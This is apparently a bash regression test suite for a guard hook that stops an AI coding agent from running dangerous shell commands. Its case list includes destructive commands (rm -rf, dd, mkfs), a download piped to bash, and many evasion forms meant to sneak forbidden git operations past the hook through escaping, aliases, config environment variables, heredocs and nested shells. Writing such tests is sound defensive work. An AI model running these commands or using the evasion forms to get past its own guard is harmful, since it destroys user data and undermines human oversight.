#!/bin/bash
# Deterministic regression suite for ../block-dangerous-command.sh, the Codex PreToolUse hook for
# Bash. Each case feeds the hook one command as hook JSON on stdin and checks the decision:
# exit 2 is a block, exit 0 an allow, any other exit code is a failure.
#
# Cases are one per line: the expected decision (B = block, A = allow), a tab, then the command.
# `\n` and `\r` in a command are written as escapes and expanded with printf %b, so multi-line and
# CRLF commands fit on one line; `\\` is a literal backslash.
#
# The hook uses the first awk and jq on PATH. To run it under each installed awk, and on Windows
# also with LF-only jq output, use test-block-dangerous-command-matrix.sh.
#
# Usage: bash test-block-dangerous-command.sh [path-to-hook]
set -uo pipefail

HOOK="${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/block-dangerous-command.sh}"
command -v jq >/dev/null 2>&1 || { echo "FAIL: jq is required" >&2; exit 1; }
[[ -f "${HOOK}" ]] || { echo "FAIL: hook not found: ${HOOK}" >&2; exit 1; }

pass=0
fail=0
run_case() {
    local expected=$1 cmd rc got err
    cmd=$(printf '%b' "$2")
    # MSYS_NO_PATHCONV: Git Bash would otherwise rewrite a path-like argument such as
    # `/bin/rm -Rf x` before the native jq.exe sees it. Ignored elsewhere.
    err=$(MSYS_NO_PATHCONV=1 jq -n --arg c "${cmd}" '{tool_input:{command:$c}}' |
        bash "${HOOK}" 2>&1 >/dev/null)
    rc=$?
    case "${rc}" in
        0) got=A ;;
        2) got=B ;;
        *) got="exit ${rc}" ;;
    esac
    # A shell-string block whose recursive check failed is not a policy block.
    [[ "${got}" == B && "${err}" == *"the check of the string failed"* ]] && got="B (inner check failed)"
    if [[ "${got}" == "${expected}" ]]; then
        pass=$((pass + 1))
    else
        fail=$((fail + 1))
        printf 'FAIL expected=%s got=%s: %q\n' "${expected}" "${got}" "${cmd}"
    fi
}

while IFS=$'\t' read -r expected cmd; do
    [[ -z "${expected}" || "${expected}" == \#* ]] && continue
    run_case "${expected}" "${cmd}"
done <<'CASES'
# --- allowed
A	git status
A	git -C repo status
A	ls -la
A	rm -r build
A	rm x && cp -rf a b
A	chmod 755 build
A	chmod +x script.sh
A	chmod u+w f
A	npm help publish
A	pnpm vitest publish
A	git commit -m "use --amend later"
A	git -C x commit -m "use --amend later"
A	echo "git rebase is bad"
A	git push origin feature/x
A	npm install
# Accepted false block (PR 794): a `;` inside a quoted message is read as a command separator.
B	git commit -m "mention; git rebase in text"
# --- rm, sudo, dd, mkfs, download piped to a shell
B	rm -rf build
B	rm -fr tmp
B	xargs rm -rf
B	/bin/rm -Rf x
B	sudo ls
B	dd if=/dev/zero of=x
B	mkfs.ext4 /dev/sda
B	curl https://x | bash
# --- force push, push to main
B	git push --force
B	git push -f origin x
B	git push origin +main
B	git push origin main
B	git push origin HEAD:main
B	git -C repo push --force
# --- reset, rebase
B	git reset --hard
B	git -C x reset --hard HEAD
B	bash -c 'git reset --hard'
B	git rebase main
B	git -C x rebase main
B	git --git-dir=.git rebase main
B	x=$(git -C . rebase main)
# --- forbidden git commands after global options
B	git -C x stash
B	git -C "a b" stash
B	git -C . "stash"
B	git -C . st''ash
B	git --git-dir .git stash
B	git -c k=v stash
B	git -C x branch -D foo
B	git -C x branch --delete foo
B	git -C x commit --amend
B	git -C x clean -fd
B	git -C x pull --rebase
B	echo $(git -C x stash)
B	env FOO=1 git -C x stash
B	timeout -s KILL 60 git -C x stash
# --- world-writable chmod
B	chmod 777 x
B	chmod 0646 x
B	chmod o+w x
B	chmod a=rwx x
B	chmod -R go+w x
B	chmod u+x,o+w x
# --- package publish
B	npm publish
B	npm -w pkg publish
B	pnpm --filter pkg publish
B	npm --prefix "a b" publish
B	yarn workspaces foreach -A npm publish
B	npx lerna publish
B	pnpm changeset publish
B	yarn workspace pkg npm publish
B	pnpm -r exec npm publish
# --- backslash-newline continuation (a native Windows jq.exe writes these newlines as CRLF)
B	git -C x \\\nreset --hard
B	git -C x \\\nstash
# bash removes the backslash-newline pair with nothing, so a word split by one is joined (issue #802).
B	git re\\\nbase main
B	git -C . sta\\\nsh
# A quoted heredoc body is not joined by bash: `x\` + newline + `EOF` still ends it, so the split
# command after it runs.
B	cat > f <<'EOF'\nx\\\nEOF\ngit re\\\nbase main\nEOF
# --- a backslash inside a word: bash removes it, so the word is the forbidden one
B	git re\\base main
B	git reset --ha\\rd
B	git -C . st\\ash
B	git -C "a b" st\\ash
B	git -C . st\\a"sh"
B	git push --fo\\rce
B	\\rm -rf build
B	r\\m -rf build
B	rm -r\\f build
# An escaped space or separator stays inside the option value or assignment.
B	git -c x.y=a\\ b stash
B	git -c x.y=a\\ b rebase main
B	git -c x.y=a\\ b reset --hard
B	git -c x.y=a\\;b stash
B	X=a\\ b git rebase main
B	npm --prefix a\\ b publish
# Inside single quotes a backslash is literal, then an escaped space: one word (issue #838).
B	git -c x.y='a b\\'c\\ d stash
B	git -c x.y='a b\\'\\; stash
B	git -c x.y='a b\\'c\\ d rebase main
B	npm --prefix 'a b\\'c\\ d publish
B	git -c x.y=a\\ b re\\base main
B	git -c x.y=a\\ b st\\ash
B	npm --prefix a\\ b pu\\blish
# ANSI-C quoting is decoded.
B	git -C . $'stash'
B	git -C . $'st\\x61sh'
B	git -C . $'st\\141sh'
# A $'...' string ends at its first unpaired quote, also right after \\c.
B	git -C . commit -m $'\\c' ; git -C . stash #'
B	git -C . commit -m $'\\c\\\\' --amend #'
# Escaped forms that another shell reads again stay blocked.
B	/bin/sh -c 'git reset --ha\\rd'
B	su -c 'git push --fo\\rce' u
B	find . -execdir sh -c 'git reset \\-\\-hard' \\;
B	echo >(git push --fo\\rce)
B	git -c alias.x='!git push \\-\\-force' x
# Accepted false block (issue #840): the hook cannot tell a search pattern from a string that
# another shell runs (the alias above), so escaped text in quotes is read without backslashes.
B	rg 'git reset \\-\\-hard' .codex
B	rg 'git push \\-\\-force' .
# A message value is found by words, so continued and prefixed commands keep it text (#840).
A	git -C . commit \\\n-m "mention --amend later"
A	git -C . commit -m \\\n"mention --amend later"
A	GIT_AUTHOR_NAME="Jane Doe" git -C . commit -m "Document --amend behavior"
A	env GIT_AUTHOR_NAME="Jane Doe" git -C . commit -m "Document --amend behavior"
A	X=1 git -C . commit -m "a --amend"
A	git -C . commit -am "use --amend later"
A	git -C . commit -m "use --amend later" 2>&1
A	git -C . commit --message="use --amend later"
A	git -C . commit -m "--amend"
A	git -C . tag -a v1 -m "drop -d later"
# Only a value-taking option hides the next word: commit -e and branch -m take none (#840).
B	git -C . commit -e "--amend"
B	git -C . branch -m "--delete" x
# Words bash joins or splits differently from the line are read as bash reads them.
B	git -c x.y=a\\ grep commit -e "--amend"
B	git -C . commit -mfix\\\n-m "--amend"
B	git -C . commit -m a\\ #\\\n --amend
# An option the scanner does not know, or an expansion, stops blanking.
B	git -C . commit -F msg -m "--amend"
# A global option value is not the subcommand.
B	git --shallow-file x stash
B	git --shallow-file commit branch -m "--delete" x
# A long message is still a value: blanked whole, though the stored word is cut.
A	git -C . commit -m "fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook fix the hook and drop the --amend path"
# A word longer than the stored 256 characters has an unknown value.
B	git -C . commit -aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaamx --amend
B	git -C . commit -aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaF -m --amend
B	git -C . commit -m $m "--amend"
B	o=-F; git -C . commit "$o" -m --amend
# Accepted false block: a message that holds a variable has an unknown value, as on main.
B	git -C . commit -m "drop --amend from $script"
B	f() { :; }; git -C . commit -m x "--amend"
# git accepts an unambiguous prefix of a long option, with or without global options.
B	git commit --am
B	git -C . commit --ame
B	git -C . branch --del x
B	git tag --delete v1
B	git -C . tag --del v1
B	git -C . clean --forc
B	git pull --reb
B	git -C . pull --no-reb
B	git pull --sq
A	git branch --list
A	git -C . tag --list
A	git -C . branch --describe x
A	git pull --ff-only
A	git -C . commit --allow-empty -m "x"
# A short-option cluster that holds a forbidden option.
B	git -C . branch -Dq x
B	git branch -dr origin/x
B	git -C . pull -qr
A	git branch -vv
A	git pull -q
# A setting for one command that turns off clean's force check or defines a shell alias.
B	git -c clean.requireForce=false clean -d
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=clean.requireForce GIT_CONFIG_VALUE_0=false git clean -d
B	git -c alias.x='!git stash' x
B	git -c 'alias.x=!sh -c x' x
# Any alias for one command: it can name a forbidden subcommand without a `!`.
B	git -c alias.x=stash x
B	git -c alias.x='reset --hard' x
B	git -c alias.p='push --force' p
B	V='!git stash' git --config-env=alias.x=V x
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0='!git stash' git x
B	git -c pull.rebase=true pull
B	git -c branch.main.rebase=true pull
B	git -c merge.ff=false pull
B	git -c pull.rebase pull
B	git -c branch.main.rebase pull
A	GIT_CONFIG_GLOBAL=~/alias.cfg git status
A	git log --grep 'example -c alias.x=value'
A	rg 'git -c pull.rebase=true' docs
A	gcc -c alias.c
A	tar -c alias.txt
A	make -C alias.d
A	git -c core.editor=vim status
A	git log --grep "alias.x=!"
# A forbidden git command inside a string that a shell runs.
B	bash -c 'git stash'
B	sh -c "git merge x"
B	bash -c 'cd x && git stash'
B	ssh host 'git branch --del x'
B	eval 'git -C . st\\ash'
B	bash -c "echo 'start'; git stash"
B	bash -c $'git stash'
B	bash -c 'if :; then git stash; fi'
B	bash -c 'X=1 git stash'
B	bash -c 'cd x && env git stash'
B	bash -c 'timeout 5 git stash'
B	bash -c 'nice -n 5 git stash'
B	eval git -C . stash
A	bash -c 'git status'
A	sh -c "git merge-base a b"
# A per-command setting inside such a string.
B	bash -c 'git -c alias.x=stash x'
B	zsh -c 'git -c alias.x=stash x'
B	ssh host 'git -c alias.x=stash x'
B	su -c 'git -c clean.requireForce=false clean -d' u
B	ssh host "cd x && git --config-env=alias.x=V x"
B	zsh -c 'git -c pull.rebase pull'
B	bash -c 'git -c '"alias.x=stash"' x'
B	bash -c 'git -c "alias.x=stash" x'
B	ssh host 'git -c al""ias.x=stash x'
B	su -c "git -c 'clean.requireForce=false' clean -d" u
B	ssh -o "ConnectTimeout 5" host 'git -c alias.x=stash x'
A	ssh host 'git -c core.editor=vim status'
A	zsh -c 'rg "-c alias.x=" docs'
B	bash -c 'git -c "pull.rebase" pull'
B	ssh -o "A b" host 'git -c pull.rebase pull'
# A rebase inside a shell string.
B	bash -c 'git rebase main'
B	ssh host 'git rebase main'
B	zsh -c 'git rebase main'
# A whole `bash -c '...'` whose string bash passes through unchanged is checked as a command
# of its own, so a message inside it stays text; any other form keeps the text pattern.
A	bash -c 'git commit -m "document --amend behavior"'
A	sh -c "git commit -m 'document --amend behavior'"
A	bash -lc 'git tag -a v1 -m "drop -d later"'
B	bash -c 'git commit -m "x" --amend'
B	bash -c 'git -C . commit -m "x" --amend'
B	bash -c 'git commit --am -m "x"'
B	/bin/bash -c 'git stash'
B	bash -c 'git commit -m "'"'"'" --amend'
B	ssh host 'git commit -m "'"'"'" --amend'
B	bash -c 'git commit -m "a" --amend' x
B	bash -c "git commit -m \\"a\\" --amend"
B	bash -c 'git commit -m "x" --amend' ; echo
B	bash -c 'bash -c "git stash"'
B	bash -O -c 'git stash'
B	bash -c 'echo >(git stash)'
B	bash -c 'case x in x) (git stash);; esac'
B	bash -c 'f() (git stash); f'
B	bash -kc 'git commit -m X=1 -m --amend'
B	bash -c 'set -k; git commit -m X=1 -m --amend'
B	bash -kc 'git commit -m X+=1 -m --amend'
B	bash -c 'set -o keyword; git commit -m X+=1 -m --amend'
B	set -k; git -C . commit -m X=1 -m --amend
B	bash -c '/usr/bin/git stash'
B	bash -c 'X=/a git stash'
# A redirection before git, an operator or redirection right after the subcommand, and a
# NAME=value word that `set -k` removes before an option value.
B	>x git -C . stash
B	2>&1 git -C . stash
B	bash -c '>x git stash'
B	bash -c 'git commit -m "doc --amend"; >x git stash'
B	sh -c 'true &>x git stash'
B	git -C . stash|cat
B	git -C . stash>x
B	bash -c 'git stash&&true'
B	bash -c 'git reset|cat'
B	set -k; git -C X=1 . stash
B	bash -kc 'git -C X=1 . stash'
B	bash -c 'shopt -so keyword; git -C X=1 . stash'
B	git X=1 -C . stash
A	git -C . status|cat
A	git -C . log>x
A	echo >x git stash
A	git -C . merge-base a b|cat
A	git -c user.name=x commit -m "fix"
A	git -C . commit -m "fix" 2>&1
A	git -C . status >x 2>&1
A	bash -c 'git status|cat'
B	git 2>/dev/null -C . stash
B	git -C . >x stash
B	bash -c 'git 2>x stash'
B	ssh h 'git >x reset'
B	set -k; git -c X=1 alias.x=stash x
B	set -k; git --config-env X=1 alias.x=V x
B	bash -c 'set -k; git -c X=1 alias.x=stash x'
B	{fd}>x git -C . stash
B	ssh h 'true; >"a b" git stash'
A	git log --format=%H|head
A	git diff>patch
A	git -c core.x=1 status
# A redirection with a blank before its target.
B	> x git -C . stash
B	2> /dev/null git -C . stash
B	git -C . 2> /dev/null stash
B	git > x stash
B	bash -c 'git > x stash'
B	bash -c '> x git stash'
B	ssh h '> x git stash'
A	git -C . log > out.txt
A	git -C . status 2> /dev/null
# A quoted reply line (`> ...`) in a PR body or a message is text, not a redirection.
A	gh pr create --body-file - <<'EOF'\n> Never git rebase shared branches\n> Run git stash first\nEOF
A	git -C . commit -m "fix the hook\n> Never git rebase shared branches\n> Run git stash first"
# Accepted false block: a nested string is read as text only.
B	bash -c 'bash -c "git commit -m \\"x --amend\\""'
# Accepted false block: text that names such a string, like the git reset --hard text check.
B	echo "bash -c 'git stash' is blocked"
# A quoted assignment or wrapper value before the command.
B	X="a b" git rebase main
B	X='a b' git -C . stash
B	env X="a b" git rebase main
B	env -u "a b" git -C . stash
# A quoted `\\` + newline is no continuation; the next line's `\` + newline is one.
B	git -C . commit -m "a\\\\\n" ; git -C . sta\\\nsh ; echo "'" \\'
# --- heredocs: only an allowlisted whole command (cat > FILE <<'EOF', or a commit message
# through "$(cat <<'EOF'") loses its body; every other body is checked as code.
A	cat > note.md <<'EOF'\ngit rebase main\nEOF
B	cat > note.md <<"EOF"\ngit -C x stash\nEOF
B	cat > note.md <<EOF\n$(git rebase main)\nEOF
B	bash <<'EOF'\ngit rebase main\nEOF
B	ssh host <<'EOF'\ngit -C x stash\nEOF
B	cat <<'EOF'\ngit rebase main
B	cat > n <<'EOF'\nhi\nEOF\ngit rebase main
# EOF + CR does not end the heredoc in bash, so the git line after the plain EOF runs.
B	cat <<'EOF'\nEOF\r\ncat <<'Z'\nEOF\ngit -C . stash\nZ
# --- commands that themselves use CRLF
B	git -C x stash\r\necho ok
B	git rebase main\r
# bash does not continue a line after backslash + CR, so neither command runs a stash or reset.
A	git -C x \\\r\nreset --hard
A	git -C x \\\r\nstash
# The opener's delimiter is EOF + CR; the hook only knows EOF and keeps the body (blocks more).
B	cat > note.md <<'EOF'\r\ngit rebase main\r\nEOF\r\necho done
# Text after the closing quote is part of the delimiter: bash ends this heredoc on EOFX.
B	cat <<'EOF'X\nhi\nEOFX\ngit -C . stash\nEOF
# A CR after the closing quote makes the delimiter EOF + CR, so the EOF + CR line ends it.
B	cat <<'EOF'\r\nx\r\nEOF\r\ngit -C . stash\nEOF
A	cat <<'EOF' > note.md\ngit rebase main\nEOF
# The closing quote must match the opener, not a quote before the <<.
B	echo ''<<"EOF' "\nEOF' \ngit -C . stash\nEOF
B	echo ''<<"EOF'\n"; git -C . stash\nEOF
# A << inside quotes is text: $( inside single quotes and an escaped \" do not reopen code.
B	echo '$('x'<<'EOF' '\ngit -C . stash\nEOF
B	echo "\\"<<'EOF' "\ngit -C . stash\nEOF
# A lone backslash escapes the first <, so this is input from a file named EOF, not a heredoc.
# $[ ] is arithmetic, not a heredoc.
B	echo \\<<'EOF'\ngit -C . stash\nEOF
B	echo \\\\<<'EOF'\ngit -C . stash\nEOF
B	echo $[1<<'EOF' ]\ngit -C . stash\nEOF
B	echo $((1<<'EOF' ))\ngit -C . stash\nEOF
# A quote or an unquoted heredoc opened on an earlier line: the << below is not a heredoc.
B	echo "a\ncat <<'EOF'\n"\ngit -C . stash\nEOF
B	echo 'a\ncat <<'EOF'\n'\ngit -C . stash\nEOF
B	cat <<X\ncat <<'EOF'\nX\ngit rebase main\nEOF
# A quote inside a comment on an earlier line opens no string.
B	# say "hi\necho "x\ncat <<'EOF'\n"; git rebase main\nEOF
B	# don't\necho 'x\ncat <<"EOF"\n'; git rebase main\nEOF
B	# don't rebase\ncat > note.md <<'EOF'\ngit rebase main\nEOF
# Two heredocs on one line: bash reads both bodies in turn.
B	cat <<'A' <<'B'\nA\ncat <<'C'\nB\ngit rebase main\nC
# A case pattern inside $( ends with a ) that does not close the $( .
B	x="$(case y in y) echo "cat <<'EOF'\n"; git rebase main ;; esac)"\nEOF
# Inside $( bash ends the heredoc at EOF) and runs the next line.
B	x="$(cat <<'EOF'\nhi\nEOF)"\ngit rebase main\nEOF
# Pass-4 shapes: an open quote after the opener, a [[ =~ ]] word, case split by a
# continuation, an alias that opens a quote.
B	cat <<'EOF'; echo "\n"; git rebase main\nEOF
B	[[ x =~ a|#' ]]\ncat <<"EOF"\n' ]]\ngit rebase main\nEOF
B	x="$(ca\\\nse y in y) echo "cat <<'EOF'\n"; git rebase main ;; esac)"\nEOF
B	shopt -s expand_aliases; alias q='echo "'\nq cat <<'EOF'\n"; git rebase main\nEOF
# The allowlisted whole commands lose their body; the first line is still checked.
A	cat >> note.md <<'EOF'\ngit rebase main\nEOF
A	cat <<'EOF' > note.md\ngit -C x stash\nEOF
A	git commit -m "$(cat <<'EOF'\nfix: do not git rebase main\nEOF\n)"
A	git commit -s -m "$(cat <<'EOF'\nfix: x\n\ngit -C x stash is blocked\nEOF\n)"
B	git -C x commit --amend -m "$(cat <<'EOF'\nmsg\nEOF\n)"
# Bash before 4.0 ends $( by scanning the body, so the commit form keeps a body whose
# parentheses are unbalanced, or that holds a quote, backtick, backslash or # before a paren.
A	git commit -m "$(cat <<'EOF'\nfix(codex): x\n\ngit rebase main is blocked\nEOF\n)"
B	git commit -m "$(cat <<'EOF'\nfix: x)\ngit rebase main\nEOF\n)"
B	git commit -m "$(cat <<'EOF'\nfix: x\n)(\ngit rebase main\nEOF\n)"
B	git commit -m "$(cat <<'EOF'\nfix: don't\ngit rebase main\nEOF\n)"
B	git commit -m "$(cat <<'EOF'\nfix: `x`\ngit rebase main\nEOF\n)"
B	git commit -m "$(cat <<'EOF'\nfix: x # (\ngit rebase main\nEOF\n)"
# Anything after the heredoc, or a different closing line, is checked whole.
B	cat > note.md <<'EOF'\nhi\nEOF\ngit rebase main
B	git commit -m "$(cat <<'EOF'\nmsg\nEOF\n)"; git rebase main
B	cat > "note.md" <<'EOF'\ngit rebase main\nEOF
B	cat > a <<'EOF'\ngit rebase main\nEOF\ncat > b <<'EOF'\ngit -C x stash\nEOF
B	echo "$(cat <<'EOF')"\ngit rebase main\nEOF
# --- options with a value before the message: the value is skipped, the message still blanked
A	git -C . commit -S -m 'Document --amend behavior'
A	git commit -S -m 'mention --amend'
A	git commit -aS -m 'mention --amend'
A	git commit --gpg-sign=KEY -m 'use --amend'
A	git commit --author='A <a@b>' -m 'mention --amend'
A	git -C . commit --author 'A <a@b>' -m 'mention --amend'
A	git -C . commit --date=now --trailer 'Refs: x' -m 'use --amend'
A	git -C . tag -u KEY -m 'see -d here' v1
A	git -C . tag --local-user=KEY -m 'see -d here' v1
# -Sm signs with key m, so the next word is a real option
B	git -C . commit -Sm --amend
B	git -C . commit -S --amend -m x
B	git -C . commit --author x --amend -m y
B	git -C . commit --author X=1 -m --amend
B	git -C . tag -um -d v1
B	git -C . tag -u KEY -d v1
# --- a --format value is text, also when it holds a delete flag
A	git branch --list --format='%(refname:short) -d docs'
A	git branch --format '%(refname) --delete' --list
A	git -C . tag --list --format='%(refname) -d x'
B	git branch --format x -d docs
B	git branch -d --format x docs
B	git -C . tag --format x -d v1
# --- GIT_CONFIG_* anywhere, except as the pattern of a plain search
A	git grep -n 'GIT_CONFIG_KEY_0=pull.rebase'
A	rg 'GIT_CONFIG_PARAMETERS=alias.x' docs
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x
B	env GIT_CONFIG_KEY_0=pull.rebase GIT_CONFIG_VALUE_0=true git pull
B	export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x; git x
B	echo `GIT_CONFIG_KEY_0=alias.x git x`
B	ssh host 'GIT_CONFIG_KEY_0=alias.x git x'
B	x=1; GIT_CONFIG_PARAMETERS="'alias.x=stash'" git x
B	set -k; git x GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash
B	/usr/bin/env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x
B	setsid env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x
B	echo `env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x`
B	echo ` GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x`
B	true >(GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x)
B	case 1 in 1) GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x;; esac
B	A=$(echo a b) GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x
B	export -- GIT_CONFIG_PARAMETERS="'alias.x'='stash'"; git x
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0+=alias.x GIT_CONFIG_VALUE_0=stash git x
B	bash -c "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x"
# Quotes, $'...' or a backslash-newline inside the value, quoted env/export/declare arguments,
# env -S, and a later GIT_CONFIG_PARAMETERS entry (security review of PR 854, round 2).
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=al""ias.x GIT_CONFIG_VALUE_0=stash git x
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0='alias'.x GIT_CONFIG_VALUE_0=stash git x
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=$'\\x61lias.x' GIT_CONFIG_VALUE_0=stash git x
B	GIT_CONFIG_PARAMETERS="'al''ias.x'='stash'" git x
B	bash -c 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=al""ias.x GIT_CONFIG_VALUE_0=stash git x'
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=al\\\nias.x GIT_CONFIG_VALUE_0=stash git x
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KE\\\nY_0=alias.x GIT_CONFIG_VALUE_0=stash git x
B	env "GIT_CONFIG_COUNT=1" "GIT_CONFIG_KEY_0=alias.x" "GIT_CONFIG_VALUE_0=stash" git x
B	export 'GIT_CONFIG_PARAMETERS='"'alias.x'='stash'"; git x
B	declare -x "GIT_CONFIG_KEY_0=alias.x" GIT_CONFIG_COUNT=1 GIT_CONFIG_VALUE_0=stash; git x
B	env -S'GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_COUNT=1 GIT_CONFIG_VALUE_0=stash git x'
B	env --split-string=GIT_CONFIG_KEY_0=alias.x\\ GIT_CONFIG_COUNT=1\\ GIT_CONFIG_VALUE_0=stash\\ git\\ x
B	GIT_CONFIG_PARAMETERS="'user.name'='x' 'alias.x'='stash'" git x
# The search exception: one git grep, grep or rg with one single-quoted argument, nothing else.
A	grep -rn 'GIT_CONFIG_KEY_0=alias.x' .codex/hooks
A	git -C . grep -n -- 'GIT_CONFIG_KEY_0=alias.x' -- src
B	git grep "GIT_CONFIG_KEY_0=alias.x"
B	git grep -O'env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x' x
B	git grep -nO 'GIT_CONFIG_KEY_0=alias.x'
B	git grep --open-files-in-pager='GIT_CONFIG_KEY_0=alias.x' x
B	rg --pre=x 'GIT_CONFIG_KEY_0=alias.x'
B	git grep 'GIT_CONFIG_KEY_0=alias.x'; GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x
B	git grep 'GIT_CONFIG_KEY_0=alias.x'\n GIT_CONFIG_COUNT=1 git x
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git grep 'x'
B	git -c alias.grep=x grep 'GIT_CONFIG_KEY_0=alias.x'
B	grep 'GIT_CONFIG_KEY_0=alias.x' GIT_CONFIG_PARAMETERS=alias.x
B	git grep '-OGIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x #' -e e
B	git grep '-nOGIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x #' -e e
B	git grep '--op=GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=stash git x #' -e e
B	git grep --op 'GIT_CONFIG_KEY_0=alias.x' x
A	git grep -n -e 'GIT_CONFIG_KEY_0=alias.x'
# --- -c values that keep the restriction are allowed; any other value of the key is not
A	git -c pull.ff=only pull
A	git -c "pull.ff=only" pull
A	git -c clean.requireForce=true clean -n
A	bash -c 'git -c pull.ff=only pull'
B	git -c pull.ff=false pull
B	git -c pull.ff=onlyx pull
B	git -c pull.ff= pull
B	git -c pull.ff=only -c pull.ff=false pull
B	git -c pull.ff=false -c pull.ff=only pull
B	git -c clean.requireForce=false clean -d
B	git -c clean.requireForce=truex clean -d
B	git -c clean.requireForce=true -c clean.requireForce=false clean -d
B	git --config-env pull.ff=only pull
B	git --config-env=clean.requireForce=true clean -d
B	bash -c 'git -c pull.ff=false pull'
B	ssh host 'git -c clean.requireForce=false clean -d'
# Gaps that predate PR 854, found by its security review: a tag delete in a flag cluster, a
# bare `-c pull.ff` (true) and branch.<name>.mergeOptions.
B	git -C . tag -di v1
B	git tag -id v1
B	git tag -df v1
B	bash -c 'git tag -di v1'
# git rejects -d with any flag but -i, so these delete nothing and are allowed.
A	git -C . tag -fd v1
A	git tag -Fd v1
A	git tag -mdone v1
A	git -C . tag -a -m 'see -fd' v1
A	git tag -n5
A	git tag -fs v1
B	git -c pull.ff pull
B	git -c pull.ff -c x.y=z pull
B	bash -c 'git -c pull.ff pull'
B	git -c pull.ff>/dev/null pull
B	git -c pull.rebase>/dev/null pull
B	git -c pull.ff<x pull
B	git -c branch.main.mergeOptions=--no-ff pull
B	git --config-env branch.x.mergeOptions=E pull
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=branch.main.mergeOptions GIT_CONFIG_VALUE_0=--no-ff git pull
A	git -c branch.main.merge=refs/heads/main pull
# --- issue #863: branch.autoSetupRebase makes git set branch.<name>.rebase for a new tracking
# branch, so a later plain pull rebases
B	git -c branch.autoSetupRebase=always checkout -b x origin/x
B	git -c branch.autosetuprebase=remote switch -c x origin/x
B	git -c "branch.autoSetupRebase=local" branch --track x main
B	git --config-env branch.autoSetupRebase=V checkout -b x origin/x
B	git --config-env=branch.autoSetupRebase=V checkout -b x origin/x
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=branch.autoSetupRebase GIT_CONFIG_VALUE_0=always git checkout -b x origin/x
B	GIT_CONFIG_PARAMETERS="'branch.autoSetupRebase'='always'" git checkout -b x origin/x
B	bash -c 'git -c branch.autoSetupRebase=always checkout -b x origin/x'
A	git -c branch.autoSetupMerge=always checkout -b x origin/x
# a GIT_CONFIG_* key ends where git's key ends: only a further key character makes it another key
A	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=pull.ffx GIT_CONFIG_VALUE_0=1 git status
A	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=branch.x.rebaseOther GIT_CONFIG_VALUE_0=1 git status
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=pull.ff GIT_CONFIG_VALUE_0=false git pull
B	export GIT_CONFIG_KEY_0=pull.ff
B	GIT_CONFIG_KEY_0="pull.ff" GIT_CONFIG_COUNT=1 GIT_CONFIG_VALUE_0=false git pull
